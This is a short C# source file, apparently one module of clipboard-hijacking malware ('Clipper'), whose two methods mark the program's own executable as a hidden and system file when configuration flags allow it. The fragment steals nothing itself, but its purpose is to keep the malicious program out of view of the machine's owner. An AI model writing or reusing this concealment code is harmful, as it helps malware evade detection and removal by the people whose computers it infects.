﻿using System;
using System.IO;
using System.Reflection;

namespace Clipper.Modules
{
	internal sealed class Attributes
	{
		public static void set_hidden()
		{
			if (config.attribute_hidden)
			{
				Attributes.file.Attributes |= FileAttributes.Hidden;
			}
		}

		public static void set_system()
		{
			if (config.attribute_system)
			{
				Attributes.file.Attributes |= FileAttributes.System;
			}
		}

		private static string executable = Assembly.GetEntryAssembly().Location;

		private static FileInfo file = new FileInfo(Attributes.executable);
	}
}
